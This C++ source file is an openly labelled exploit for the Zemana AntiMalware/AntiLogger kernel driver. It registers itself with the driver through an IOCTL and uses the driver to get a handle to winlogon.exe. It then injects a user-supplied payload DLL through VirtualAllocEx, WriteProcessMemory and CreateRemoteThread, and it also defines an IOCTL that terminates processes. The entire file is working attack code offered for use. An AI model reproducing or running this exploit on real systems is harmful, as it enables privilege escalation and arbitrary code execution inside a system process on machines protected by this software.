/*

    MIT License

    Copyright (c) 2021 Kento Oki

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

*/

#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <memory>
#include <filesystem>

#ifndef _WIN64
#error "Only x64 supported"
#endif

// RtlInitUnicodeString(&DestinationString, L"\\DosDevices\\amsdk")
// RtlInitUnicodeString(&DestinationString, L"\\DosDevices\\B5A6B7C9-1E31-4E62-91CB-6078ED1E9A4F");
#define ZMN_DEVICE_NAME "\\\\.\\amsdk"
#define ZMN_IOCTL_TYPE 0x8000

#define ZMN_IOCTL_OPEN_PROCESS_HANDLE          CTL_CODE(ZMN_IOCTL_TYPE, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x8000204C
#define ZMN_IOCTL_OPEN_THREAD_HANDLE           CTL_CODE(ZMN_IOCTL_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002084
#define ZMN_IOCTL_REGISTER_PROCESS             CTL_CODE(ZMN_IOCTL_TYPE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002010
#define ZMN_IOCTL_TERMINATE_PROCESS            CTL_CODE(ZMN_IOCTL_TYPE, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002048
#define ZMN_IOCTL_GET_KERNEL_IMAGE_INFORMATION CTL_CODE(ZMN_IOCTL_TYPE, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002020

using scope_exit = std::unique_ptr<void, decltype(&CloseHandle)>;
static HANDLE device_handle = INVALID_HANDLE_VALUE;

template<typename C, typename ... A>
bool each_process(const C&& callback, A const& ... args)
{
    PROCESSENTRY32 process_entry{ sizeof(PROCESSENTRY32) };
    const scope_exit snapshot{ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL), &CloseHandle };

    if (!snapshot.get() || snapshot.get() == INVALID_HANDLE_VALUE)
        return false;

    Process32First(snapshot.get(), &process_entry);
    if (callback(&process_entry, args ...))
        return true;

    while (Process32Next(snapshot.get(), &process_entry))
        if (callback(&process_entry, args ...))
            return true;

    return false;
}

uint32_t find_process(const std::wstring& process_name)
{
    uint32_t ret = 0;

    each_process([&](PPROCESSENTRY32 entry) -> bool {
        if (!process_name.compare(entry->szExeFile))
        {
            ret = entry->th32ProcessID;
            return true;
        }
        return false;
        });

    return ret;
}

bool init()
{
    device_handle = CreateFile(TEXT(ZMN_DEVICE_NAME), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, NULL, NULL);

    if (device_handle == INVALID_HANDLE_VALUE)
    {
        printf("[!] failed to obtain device handle\n");
        return false;
    }

    printf("[+] device opened: 0x%lX\n", static_cast<int32_t>(reinterpret_cast<int64_t>(device_handle)));

    return true;
}

HANDLE open_process_handle(const uint32_t process_id)
{
    DWORD buffer = process_id;
    DWORD bytes_returned = 0;

    DeviceIoControl(device_handle, ZMN_IOCTL_OPEN_PROCESS_HANDLE, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, NULL);

    if (buffer != process_id)
    {
        printf("[+] zmn process handle snatched: 0x%lX\n", buffer);
        return reinterpret_cast<HANDLE>(static_cast<uint64_t>(buffer));
    }
    
    return INVALID_HANDLE_VALUE;
}

HANDLE open_thread_handle(const uint32_t thread_id)
{
    DWORD buffer = thread_id;
    DWORD bytes_returned = 0;

    DeviceIoControl(device_handle, ZMN_IOCTL_OPEN_THREAD_HANDLE, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, NULL);

    if (buffer != thread_id)
    {
        printf("[+] zmn thread handle snatched: 0x%lX\n", buffer);
        return reinterpret_cast<HANDLE>(static_cast<uint64_t>(buffer));
    }

    return INVALID_HANDLE_VALUE;
}

bool terminate_process(const uint32_t process_id)
{
    DWORD buffer = process_id;
    DWORD bytes_returned = 0;

    return DeviceIoControl(device_handle, ZMN_IOCTL_TERMINATE_PROCESS, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, NULL);
}

bool register_process(const uint32_t process_id)
{
    // We need to register myself as a registered process prior to call another IOCTLs
    //
    // .text:000000014001034A loc_14001034A:                          ; CODE XREF: ZemDeviceIoCtlHandler+A2↑j
    // .text:000000014001034A                 call    ZmnCheckIfAuthInitialized
    // .text:000000014001034F                 test    eax, eax
    // .text:0000000140010351                 jz      short loc_14001039B
    // .text:0000000140010353                 mov     edx, 1
    // .text:0000000140010358                 mov     ecx, ebp
    // .text:000000014001035A                 call    ZmnAuthIsRegisteredProcessId
    // .text:000000014001035F                 lea     rdx, aMainC     ; "Main.c"
    // .text:0000000140010366                 test    eax, eax
    // .text:0000000140010368                 jnz     short loc_1400103A2
    // .text:000000014001036A                 mov     [rsp+68h+var_38], ebp
    // .text:000000014001036E                 lea     rax, aProcessidDIsNo ; "ProcessID %d is not authorized to send IOCTLs"

    DWORD buffer = process_id;
    DWORD bytes_returned = 0;
    const bool ioctl_success = DeviceIoControl(device_handle, ZMN_IOCTL_REGISTER_PROCESS, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, NULL);
    
    return ioctl_success && bytes_returned;
}

bool exploit_exec(const std::string& dll_path)
{
    printf("[~] dll_path: %s\n", dll_path.data());
    
    const uint32_t winlogon_pid = find_process(L"winlogon.exe");
    printf("[+] winlogon pid: %d\n", winlogon_pid);
    if (!winlogon_pid)
    {
        printf("[!] failed to locate winlogon.exe pid\n");
        return false;
    }

    const scope_exit handle{ open_process_handle(winlogon_pid), &CloseHandle };
    if (handle.get() == INVALID_HANDLE_VALUE)
    {
        printf("[!] failed to obtain winlogon.exe handle\n");
        return false;
    }
    
    void* alloc_base = VirtualAllocEx(handle.get(), NULL, dll_path.size(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("[+] payload buffer allocated: 0x%p\n", alloc_base);
    if (!alloc_base)
    {
        printf("[!] failed to allocate payload buffer on winlogon.exe\n");
        return false;
    }

    static const auto kernel32 = GetModuleHandle(TEXT("kernel32.dll"));
    static const auto k32loadlib_addr = reinterpret_cast<void*>(GetProcAddress(kernel32, "LoadLibraryA"));

    std::size_t bytes_written = 0;
    if (!WriteProcessMemory(handle.get(), alloc_base, dll_path.data(), dll_path.size(), &bytes_written))
    {
        printf("[!] failed to send payload buffer\n");
        return false;
    }
    else
        printf("[+] payload buffer has been sent!\n");

    uint32_t tid = 0;
    const scope_exit thandle{ CreateRemoteThread(handle.get(), NULL, 0, (LPTHREAD_START_ROUTINE)k32loadlib_addr, alloc_base, NULL, (LPDWORD)&tid), &CloseHandle };
    if (thandle.get() == INVALID_HANDLE_VALUE)
    {
        printf("[!] failed to execute payload\n");
        return false;
    }
    else
        printf("[+] payload executed in thread %d\n", tid);

    return true;
}

int main(int argc, const char** argv, const char** envp)
{
    printf("[~] Zemana AntiMalware/AntiLogger exploit\n"
           "[~] Brought to you by https://www.godeye.club/ :)\n");

    if (argc != 2)
    {
        printf("[=] incorrect usage\n"
               "[=] usage: %s [payload.dll]\n", argv[0]);
        return EXIT_FAILURE;
    }

    const std::string dll_path = argv[1];
    if (!std::filesystem::exists(dll_path))
    {
        printf("[!] %s was not found\n", dll_path.c_str());
        return EXIT_FAILURE;
    }

    if (!init())
    {
        printf("[!] failed to initialize exploit (GetLastError: 0x%lX)\n", GetLastError());
        return EXIT_FAILURE;
    }

    if (!register_process(GetCurrentProcessId()))
    {
        printf("[!] failed to register current process to authorized list\n");
        CloseHandle(device_handle);
        return EXIT_FAILURE;
    }

    if (!exploit_exec(dll_path))
    {
        printf("[!] failed to execute exploit\n");
        CloseHandle(device_handle);
        return EXIT_FAILURE;
    }

    CloseHandle(device_handle);
    return EXIT_SUCCESS;
}
